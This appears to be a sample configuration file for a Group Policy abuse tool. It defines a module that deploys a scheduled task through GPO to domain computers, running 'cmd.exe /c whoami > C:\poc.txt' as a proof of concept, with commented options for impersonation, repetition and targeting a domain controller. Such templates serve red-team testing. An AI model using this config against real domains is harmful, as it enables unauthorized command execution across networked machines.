; Add a Scheduled Task on the target
[MODULECONFIG]
name = Scheduled Tasks
type = computer

[MODULEOPTIONS]
action = create
program = cmd.exe
arguments = /c whoami > C:\poc.txt

;impersonate = CORP\john
;repeat_every = 5
;start_from = 2025-02-19T23:21:05
;expiration_date = 2025-02-19T23:21:05
;task_name = A task generated by GPB
;author = GpoAdmin
;description = Some GPO-deployed task

[MODULEFILTERS]
;filters =
;    [
;        {
;            "operator": "AND",
;            "type": "Computer Name",
;            "value": "ad01-srv1.corp.com"
;        }
;    ]
